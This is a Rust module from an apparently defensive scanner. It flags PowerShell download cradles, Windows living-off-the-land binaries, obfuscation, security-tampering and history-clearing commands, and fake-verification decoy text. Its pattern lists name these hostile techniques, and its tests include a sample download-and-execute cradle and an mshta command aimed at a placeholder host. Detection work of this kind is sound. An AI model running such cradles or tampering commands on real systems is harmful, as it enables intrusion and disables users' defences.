//! Text-level heuristics that don't need full parsing: PowerShell download
//! cradles, Windows living-off-the-land binaries, obfuscation tricks,
//! security tampering and decoy text. All matching is on lowercase text.

use crate::{decode, sig};

#[derive(Default)]
pub struct TextFindings {
    pub signals: u64,
    pub tool: Option<&'static str>,
    /// (label, decoded text) payloads to analyse recursively.
    pub decoded: Vec<(&'static str, String)>,
    pub download: bool,
    pub exec: bool,
    pub xattr_quarantine: bool,
    pub anti_forensics: bool,
    pub posts: bool,
}

#[inline]
fn ident_char(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_' || b == b'-' || b == b'$'
}

/// `needle` appears in `hay` as a whole identifier (an optional `.exe`
/// suffix is allowed).
pub fn has_word(hay: &str, needle: &str) -> bool {
    let hb = hay.as_bytes();
    let mut from = 0;
    while let Some(pos) = hay[from..].find(needle) {
        let s = from + pos;
        let mut e = s + needle.len();
        if hb.get(e..e + 4) == Some(b".exe") {
            e += 4;
        }
        let before_ok = s == 0 || !ident_char(hb[s - 1]) && hb[s - 1] != b'.';
        let after_ok = e >= hb.len() || !ident_char(hb[e]);
        if before_ok && after_ok {
            return true;
        }
        from = s + 1;
    }
    false
}

fn any_word(hay: &str, words: &[&str]) -> bool {
    words.iter().any(|w| has_word(hay, w))
}

fn any_sub(hay: &str, subs: &[&str]) -> bool {
    subs.iter().any(|s| hay.contains(s))
}

const PS_DOWNLOAD_WORDS: &[&str] = &[
    "irm",
    "iwr",
    "invoke-restmethod",
    "invoke-webrequest",
    "start-bitstransfer",
    "wget",
    "curl",
];
const PS_DOWNLOAD_SUBS: &[&str] = &[
    ".downloadstring(",
    ".downloaddata(",
    ".downloadfile(",
    "net.webclient",
    "system.net.http",
    "httpclient",
    "msxml2.xmlhttp",
    "winhttp.winhttprequest",
    "xmlhttp",
    ".openread(",
];
const PS_EXEC_WORDS: &[&str] = &["iex", "invoke-expression", "invoke-command", "icm"];
const PS_EXEC_SUBS: &[&str] = &[
    "scriptblock]::create",
    "| powershell",
    "|powershell",
    "| pwsh",
    "|pwsh",
    ".invoke()",
    "&(gcm",
    "& (gcm",
    "&(get-command",
    "& (get-command",
    "| & ",
    "|&(",
];

const DECOY: &[&str] = &[
    "verif",
    "human",
    "captcha",
    "robot",
    "cloudflare",
    "ray id",
    "not a bot",
    "security check",
    "access granted",
    "authenticat",
    "validation",
    "press enter",
    "\u{2705}",
    "\u{2714}",
    "\u{2611}",
    ".docx",
    ".pdf",
    ".xlsx",
    "c:\\",
];

/// Comments that pretend to be part of a verification step.
pub fn decoy_comment(comment: &str) -> bool {
    let l = comment.to_lowercase();
    any_sub(&l, DECOY)
}

/// Text that looks like it does something risky (used to decide whether a
/// decoded blob is an encoded command rather than random data).
pub fn risky(l: &str) -> bool {
    any_sub(
        l,
        &[
            "http",
            "curl",
            "wget",
            "iex",
            "invoke-",
            "| sh",
            "|sh",
            "bash",
            "powershell",
            "mshta",
            "eval",
            "exec",
            "/tmp/",
            "chmod",
            "nohup",
            "downloadstring",
            "start-process",
            "cmd ",
            "python",
            "node ",
            "osascript",
            "rundll32",
            "msiexec",
            "%temp%",
            "$env:",
        ],
    )
}

/// Extract the first quoted string literal following `marker` in `orig`.
fn literal_after<'a>(lower: &str, orig: &'a str, marker: &str) -> Vec<&'a str> {
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(p) = lower[from..].find(marker) {
        let start = from + p + marker.len();
        from = start;
        let rest = &orig[start.min(orig.len())..];
        let rest = rest.trim_start_matches([' ', '(', '[']);
        let Some(q) = rest.chars().next() else { break };
        if q == '\'' || q == '"' {
            if let Some(end) = rest[1..].find(q) {
                out.push(&rest[1..1 + end]);
            }
        }
        if out.len() >= 4 {
            break;
        }
    }
    out
}

pub fn scan(lower: &str, orig: &str) -> TextFindings {
    let mut f = TextFindings::default();
    // Cheap gate: most everyday commands contain none of these letters
    // combinations, so skip the whole scan.
    let interesting = any_sub(
        lower,
        &[
            "iex",
            "invoke",
            "irm",
            "iwr",
            "download",
            "webclient",
            "base64",
            "mshta",
            "rundll32",
            "regsvr32",
            "msiexec",
            "certutil",
            "bitsadmin",
            "wmic",
            "finger",
            "nslookup",
            "cmstp",
            "installutil",
            "odbcconf",
            "-w",
            "/min",
            "/b ",
            "conhost",
            "mppreference",
            "netsh",
            "ufw",
            "setenforce",
            "spctl",
            "xattr",
            "history",
            "histfile",
            "[char",
            "-join",
            "-bxor",
            "'+'",
            "\"+\"",
            "' + '",
            "\" + \"",
            "`",
            "^",
            "%comspec",
            "%programdata",
            "ifs",
            "gcm",
            "get-command",
            "scriptblock",
            "xmlhttp",
            "start-process",
            "saps",
            "-method",
            "systemctl",
            "apparmor",
            "opensnitch",
            "windefend",
            "disableantispyware",
            "hh.exe",
            "msbuild",
            "forfiles",
            "pcalua",
            "-body",
            "-infile",
        ],
    );
    if !interesting {
        return f;
    }

    // ---- PowerShell download cradles ----------------------------------
    let ps_dl = any_word(lower, PS_DOWNLOAD_WORDS) || any_sub(lower, PS_DOWNLOAD_SUBS);
    let gcm_iex = any_sub(
        lower,
        &[
            "gcm i*x",
            "gcm *ex",
            "get-command i*x",
            "get-command *ke-ex",
            "gcm *ke-e",
        ],
    );
    let ps_exec = any_word(lower, PS_EXEC_WORDS) || any_sub(lower, PS_EXEC_SUBS) || gcm_iex;
    let is_ps = ps_dl
        && any_word(
            lower,
            &["irm", "iwr", "invoke-restmethod", "invoke-webrequest"],
        )
        || any_sub(lower, PS_DOWNLOAD_SUBS)
        || any_word(lower, &["iex", "invoke-expression"]);
    if ps_dl && ps_exec && is_ps {
        f.signals |= sig::DOWNLOAD_EXEC | sig::DOWNLOAD;
        f.download = true;
        f.exec = true;
    } else if is_ps && ps_dl {
        f.signals |= sig::DOWNLOAD;
        f.download = true;
    }
    if lower.contains(".downloadfile(")
        && (any_word(lower, &["start-process", "saps", "invoke-item", "ii"])
            || lower.contains("& $env:"))
    {
        f.signals |= sig::DOWNLOAD_EXEC;
        f.exec = true;
    }
    if gcm_iex {
        f.signals |= sig::OBFUSCATION;
    }
    if is_ps
        && any_sub(
            lower,
            &["-method post", "-method put", "-body ", "-infile "],
        )
    {
        f.posts = true;
    }
    for lit in literal_after(lower, orig, "frombase64string(") {
        if let Some(t) = decode::base64_text(lit) {
            f.signals |= sig::ENCODED_COMMAND;
            if ps_exec {
                f.signals |= sig::DECODE_EXEC;
                f.exec = true;
            }
            f.decoded.push(("decoded base64", t));
        }
    }

    // ---- Hidden windows ------------------------------------------------
    let toks: Vec<&str> = lower.split_whitespace().collect();
    for w in toks.windows(2) {
        let t = w[0].trim_start_matches(['"', '\'']);
        if t.len() >= 2 && t.starts_with("-w") && "-windowstyle".starts_with(t) {
            let v = w[1].trim_matches(['"', '\'']);
            if v.starts_with('h') || v == "1" || v.starts_with("mi") {
                f.signals |= sig::HIDDEN_WINDOW;
            }
        }
        if (t == "start" || t == "start.exe") && (w[1] == "/min" || w[1] == "/b") {
            f.signals |= sig::HIDDEN_WINDOW;
        }
    }
    if has_word(lower, "conhost") && lower.contains("--headless") {
        f.signals |= sig::HIDDEN_WINDOW;
    }

    // ---- Living-off-the-land binaries ---------------------------------
    let remote = lower.contains("http") || lower.contains("\\\\") || lower.contains("ftp://");
    let lolbin = |name: &'static str, cond: bool, exec: bool, f: &mut TextFindings| {
        if cond && has_word(lower, name) {
            f.signals |= sig::LOLBIN_REMOTE | sig::DOWNLOAD;
            f.download = true;
            if exec {
                f.signals |= sig::DOWNLOAD_EXEC;
                f.exec = true;
            }
            f.tool.get_or_insert(name);
        }
    };
    lolbin(
        "mshta",
        remote || any_sub(lower, &["javascript:", "vbscript:"]),
        true,
        &mut f,
    );
    lolbin(
        "rundll32",
        remote || any_sub(lower, &["javascript:", "davclnt", "url.dll,"]),
        true,
        &mut f,
    );
    lolbin(
        "regsvr32",
        any_sub(lower, &["/i:http", "-i:http", "scrobj"]),
        true,
        &mut f,
    );
    lolbin("msiexec", remote, true, &mut f);
    lolbin(
        "certutil",
        any_sub(lower, &["urlcache", "verifyctl"]),
        false,
        &mut f,
    );
    lolbin(
        "bitsadmin",
        any_sub(lower, &["/transfer", "/addfile"]),
        false,
        &mut f,
    );
    lolbin("wmic", lower.contains("process call create"), true, &mut f);
    lolbin("cmstp", remote || lower.contains(".inf"), true, &mut f);
    lolbin("installutil", remote, true, &mut f);
    lolbin("odbcconf", remote || lower.contains("regsvr"), true, &mut f);
    lolbin("msbuild", remote, true, &mut f);
    lolbin("hh", remote, true, &mut f);
    lolbin("pcalua", lower.contains("-a"), true, &mut f);
    lolbin("forfiles", lower.contains("/c") && remote, true, &mut f);
    let piped_to_exec = any_sub(
        lower,
        &[
            "| cmd",
            "|cmd",
            "| sh",
            "|sh",
            "| bash",
            "|bash",
            "| powershell",
            "|powershell",
            "| iex",
            "|iex",
        ],
    );
    lolbin("finger", lower.contains('@') && piped_to_exec, true, &mut f);
    let txt_query = any_sub(lower, &["-q=txt", "-type=txt", "-querytype=txt"]);
    lolbin("nslookup", txt_query && piped_to_exec, true, &mut f);
    if has_word(lower, "certutil") && any_sub(lower, &["-decode", "/decode"]) {
        f.signals |= sig::OBFUSCATION;
    }

    // ---- Obfuscation ---------------------------------------------------
    let concat = lower.matches("'+'").count()
        + lower.matches("\"+\"").count()
        + lower.matches("' + '").count()
        + lower.matches("\" + \"").count();
    if concat >= 2
        || (lower.contains("-join") && (lower.contains("[char") || lower.contains("-split")))
        || any_sub(
            lower,
            &[
                "-bxor",
                "[array]::reverse",
                "%comspec:~",
                "%programdata:~",
                "${ifs}",
                "$ifs",
                "[char[]]",
            ],
        )
        || lower.matches("[char]").count() >= 3
        || has_escape_obfuscation(orig)
    {
        f.signals |= sig::OBFUSCATION;
    }

    // ---- Security tampering --------------------------------------------
    if any_sub(
        lower,
        &[
            "disablerealtimemonitoring",
            "disableantispyware",
            "disableioavprotection",
            "add-mppreference -exclusion",
            "set-mppreference -exclusion",
            "advfirewall set allprofiles state off",
            "ufw disable",
            "setenforce 0",
            "spctl --master-disable",
            "spctl --global-disable",
            "sc stop windefend",
            "sc config windefend",
            "uninstall-windowsfeature windows-defender",
            "systemctl stop apparmor",
            "systemctl disable apparmor",
            "systemctl stop opensnitch",
            "systemctl disable opensnitch",
            "systemctl disable --now opensnitch",
            "killall opensnitch",
        ],
    ) {
        f.signals |= sig::SECURITY_TAMPER;
    }
    if has_word(lower, "xattr") && any_sub(lower, &["com.apple.quarantine", " -c", " -cr", " -rc"])
    {
        f.xattr_quarantine = true;
    }
    if any_sub(
        lower,
        &[
            "history -c",
            "unset histfile",
            "histfile=/dev/null",
            "bash_history",
            "clear-history",
            "historysavepath",
            "zsh_history",
        ],
    ) {
        f.anti_forensics = true;
    }
    f
}

/// `c^u^r^l` (cmd caret escapes) or ``i`e`x`` (PowerShell backticks)
/// splitting the letters of a word.
fn has_escape_obfuscation(orig: &str) -> bool {
    let b = orig.as_bytes();
    let mut hits = 0;
    for i in 1..b.len().saturating_sub(1) {
        if (b[i] == b'^' || b[i] == b'`')
            && b[i - 1].is_ascii_alphabetic()
            && b[i + 1].is_ascii_alphabetic()
        {
            hits += 1;
            if hits >= 2 {
                return true;
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn words() {
        assert!(has_word("iex(irm x)", "iex"));
        assert!(has_word("mshta.exe http://x", "mshta"));
        assert!(!has_word("confirm x", "irm"));
        assert!(!has_word("$iex = 1", "iex"));
        assert!(!has_word("index", "iex"));
    }

    #[test]
    fn ps_cradle() {
        let l = "iex (new-object net.webclient).downloadstring('https://x.example/a')";
        let f = scan(l, l);
        assert_ne!(f.signals & sig::DOWNLOAD_EXEC, 0);
    }

    #[test]
    fn lolbins() {
        let l = "mshta https://x.example/verify";
        let f = scan(l, l);
        assert_eq!(f.tool, Some("mshta"));
        assert_ne!(f.signals & sig::LOLBIN_REMOTE, 0);
    }

    #[test]
    fn hidden_window_prefixes() {
        for l in [
            "powershell -w h -c x",
            "powershell -win hidden x",
            "powershell -windowstyle hidden x",
        ] {
            assert_ne!(scan(l, l).signals & sig::HIDDEN_WINDOW, 0, "{l}");
        }
        let l = "powershell -noprofile -c get-date";
        assert_eq!(scan(l, l).signals & sig::HIDDEN_WINDOW, 0);
    }
}
